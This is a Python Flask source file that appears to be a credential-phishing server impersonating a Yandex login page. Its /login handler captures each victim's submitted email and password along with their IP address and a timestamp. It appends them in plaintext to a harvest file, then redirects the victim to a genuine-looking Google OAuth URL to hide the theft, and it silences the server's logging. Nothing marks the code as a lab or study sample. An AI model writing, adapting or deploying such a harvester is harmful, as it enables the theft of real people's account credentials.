from flask import Flask, render_template, request, redirect
import os
import datetime
import flask.cli
import logging

flask.cli.show_server_banner = lambda *a, **k: None
logging.getLogger('werkzeug').setLevel(logging.ERROR)


app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

path = "Yandex"
os.makedirs(path, exist_ok=True)
LOG_FILE = "Yandex.txt"
full = os.path.join(path, LOG_FILE)

if not os.path.exists(full):
    with open(full, "a", encoding="utf-8") as f:
        f.write("🔥 Yandex Login 🔥\n")
        f.write("="*50 + "\n\n")

@app.route('/')
def login_page():
    return render_template('yandex.html')

@app.route('/login', methods=['POST'])
def handle_login():
    email = request.form.get('userid', '')
    password = request.form.get('password', '')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip_address = request.remote_addr

    with open(full, 'a', encoding='utf-8') as f:
        f.write(f"Time: {timestamp} | IP: {ip_address} | Email: {email} \n\n Password : {password}")

    return redirect("https://accounts.google.com/v3/signin/accountchooser?as=KFPNBmTeI0dBSdbWFGpe_3HVnpfMX_p0QHimeBRrL6I&client_id=801668726815.apps.googleusercontent.com&display=popup&gis_params=ChdodHRwczovL3d3dy5kcm9wYm94LmNvbRINZ2lzX3RyYW5zZm9ybRgHKitLRlBOQm1UZUkwZEJTZGJXRkdwZV8zSFZucGZNWF9wMFFIaW1lQlJyTDZJMic4MDE2Njg3MjY4MTUuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb204AUJAN2IzNzRhYWZkZTFjYTViYWY1NmRjZDFkN2QzNzNiODhiNGFjYTU4M2I1YmM2NGIwMDI2YjNlYjk5MjUwYTEwNw&gsiwebsdk=gis_attributes&origin=https%3A%2F%2Fwww.dropbox.com&prompt=select_account&redirect_uri=gis_transform&response_mode=form_post&response_type=id_token&scope=openid+email+profile&dsh=KFPNBmTeI0dBSdbWFGpe_3HVnpfMX_p0QHimeBRrL6I&o2v=1&service=lso&flowName=GeneralOAuthFlow&opparams=%253Fgis_params%253DChdodHRwczovL3d3dy5kcm9wYm94LmNvbRINZ2lzX3RyYW5zZm9ybRgHKitLRlBOQm1UZUkwZEJTZGJXRkdwZV8zSFZucGZNWF9wMFFIaW1lQlJyTDZJMic4MDE2Njg3MjY4MTUuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb204AUJAN2IzNzRhYWZkZTFjYTViYWY1NmRjZDFkN2QzNzNiODhiNGFjYTU4M2I1YmM2NGIwMDI2YjNlYjk5MjUwYTEwNw%2526response_mode%253Dform_post&continue=https%3A%2F%2Faccounts.google.com%2Fsignin%2Foauth%2Fconsent%3Fauthuser%3Dunknown%26part%3DAJi8hAOElMurHtIWvOi4dttUMCR2BLrt5kJXfuPpL1GQsMEr2M4zdB5jXN4byoVVmGCQtAWbtFPfdsqHpDAXtkxOhxHtk3XzwDCb7W7ZguUibgI3V6jVJC7s0-M6VxwNNwQ6esM0KirNI7bVGIpQsvMcl7WXN9XoGUIQQXrFimgyYTkDMZyoZj_hZJbVcK8BxFQE2e3LOqFwl8c7tu_CNaLGWaKTnoXo4lcVX4SfijXV9Ct2Q_3Pn0C-joh-FHi0QjvRi5kSUfM81iHcCaYUfwHxgf4uI11SDozxD_65MBUOX8KPXSsnE-D8ELZo4k0vEcSlSRdGBGipAMA1qxA97WEi40kF4BIIZTxcClmU85Wjp6PneHqMz-0V5BuGg773ru-F7zTQM97Nr5a1NUCgHp8WiNX9TeVokhUlIaHB0lILyRtX66uVpEIbBOVhmsZ5Q3OEiI3sW43t%26flowName%3DGeneralOAuthFlow%26as%3DKFPNBmTeI0dBSdbWFGpe_3HVnpfMX_p0QHimeBRrL6I%26client_id%3D801668726815.apps.googleusercontent.com%23&app_domain=https%3A%2F%2Fwww.dropbox.com")

def run():
    app.run(host="0.0.0.0", port=5001, debug=False, use_reloader=False)

if __name__ == '__main__':
    run()